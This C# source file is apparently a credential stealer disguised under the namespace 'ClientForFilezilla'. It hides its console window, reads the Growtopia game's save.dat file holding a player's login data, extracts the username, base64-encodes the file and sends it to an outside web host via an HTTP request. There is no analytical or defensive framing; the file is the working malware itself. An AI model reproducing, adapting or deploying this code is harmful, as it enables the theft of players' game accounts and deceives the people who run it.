using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Windows;

namespace ClientForFilezilla
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        static void Main(string[] args)
        {
  
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            try
            {
                string fileSdat = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Growtopia\save.dat";
 
                string readdata = File.ReadAllText(fileSdat).Replace("\u0000", " ");
                string senddata = Encrypt(File.ReadAllText(fileSdat));
                string uname = readdata.Substring(readdata.IndexOf("tankid_name") + "tankid_name".Length).Split(' ')[3];
                WebRequest rq = WebRequest.Create("http://yrs.atwebpages.com/next.php?username=" + uname + "&" + "b64=" + senddata);
                rq.GetResponse();
            }
            catch
            {
                MessageBox.Show("Error");
            }
        }
        public static string Encrypt(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }

    }
}
